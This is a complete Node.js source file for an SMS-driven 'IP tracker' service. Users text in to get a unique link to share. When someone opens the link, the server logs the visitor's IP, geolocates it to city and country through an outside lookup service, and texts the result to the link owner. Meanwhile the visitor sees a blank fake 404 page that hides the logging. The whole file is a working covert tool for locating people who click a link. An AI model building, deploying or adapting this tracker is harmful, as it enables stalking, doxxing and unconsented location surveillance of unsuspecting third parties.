const http = require('http');
const https = require('https');
const AWS = require('aws-sdk');
const crypto = require('crypto');
const { URL } = require('url');

AWS.config.update({
  accessKeyId: process.env.AWS_ACCESS_KEY_ID,
  secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  region: process.env.AWS_REGION || 'us-east-1'
});

const sns = new AWS.SNS();
const users = new Map();

async function getLocation(ip) {
  if (ip === '::1' || ip === '127.0.0.1' || ip === 'Unknown') {
    return { country: 'Local', region: 'Local', city: 'Local' };
  }
  
  return new Promise((resolve) => {
    https.get(`https://ipapi.co/${ip}/json/`, (response) => {
      let data = '';
      response.on('data', (chunk) => data += chunk);
      response.on('end', () => {
        try {
          const location = JSON.parse(data);
          resolve({
            country: location.country_name || 'Unknown',
            region: location.region || 'Unknown',
            city: location.city || 'Unknown'
          });
        } catch (error) {
          resolve({ country: 'Unknown', region: 'Unknown', city: 'Unknown' });
        }
      });
    }).on('error', () => {
      resolve({ country: 'Unknown', region: 'Unknown', city: 'Unknown' });
    });
  });
}

function generateUserId() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendSMS(phoneNumber, message) {
  if (!process.env.AWS_ACCESS_KEY_ID) {
    console.log('AWS credentials not configured, skipping SMS');
    return;
  }

  try {
    const params = {
      Message: message,
      PhoneNumber: phoneNumber
    };
    
    await sns.publish(params).promise();
    console.log(`SMS sent to ${phoneNumber}`);
  } catch (error) {
    console.error('Failed to send SMS:', error.message);
  }
}

function registerUser(phoneNumber) {
  const userId = generateUserId();
  users.set(userId, { phone: phoneNumber, createdAt: new Date() });
  return userId;
}

function getUserByTrackingId(trackingId) {
  return users.get(trackingId);
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname;

  // Handle SMS webhook
  if (path === '/sms' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = new URLSearchParams(body);
        const fromPhone = data.get('From');
        const messageBody = data.get('Body');

        if (fromPhone && messageBody) {
          const userId = registerUser(fromPhone);
          const trackingUrl = `https://${req.headers.host}/${userId}`;
          
          await sendSMS(fromPhone, `✅ You're signed up for IP tracking!\n\nYour tracking link: ${trackingUrl}\n\nShare this link to track visitor IPs. You'll get SMS alerts when someone visits it.`);
        }

        res.writeHead(200, { 'Content-Type': 'text/xml' });
        res.end('<?xml version="1.0" encoding="UTF-8"?><Response></Response>');
      } catch (error) {
        console.error('SMS webhook error:', error);
        res.writeHead(500);
        res.end('Error');
      }
    });
    return;
  }

  // Handle tracking links (both /t/id and /id formats)
  let trackingId = null;
  if (path.startsWith('/t/')) {
    trackingId = path.split('/')[2];
  } else if (path.length > 1 && !path.includes('.')) {
    trackingId = path.substring(1);
  }

  if (trackingId) {
    const user = getUserByTrackingId(trackingId);

    if (user) {
      let clientIP = req.connection.remoteAddress || 
                     req.socket.remoteAddress ||
                     req.headers['x-forwarded-for'] ||
                     req.headers['x-real-ip'] ||
                     req.headers['x-client-ip'] ||
                     'Unknown';

      if (clientIP.includes(',')) {
        clientIP = clientIP.split(',')[0].trim();
      }

      if (clientIP.startsWith('::ffff:')) {
        clientIP = clientIP.substring(7);
      }

      const location = await getLocation(clientIP);
      console.log(`IP tracked for user ${user.phone}: ${clientIP} | ${location.city}, ${location.region}, ${location.country}`);

      const alertMessage = `🚨 IP Tracker Alert!\nIP: ${clientIP}\nLocation: ${location.city}, ${location.region}, ${location.country}\nTime: ${new Date().toLocaleString()}\nLink: /${trackingId}`;
      
      await sendSMS(user.phone, alertMessage);
    }

    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>');
    return;
  }

  // Default 404 response
  res.writeHead(404, { 'Content-Type': 'text/html' });
  res.end('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body></body></html>');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`IP tracking server running on port ${PORT}`);
});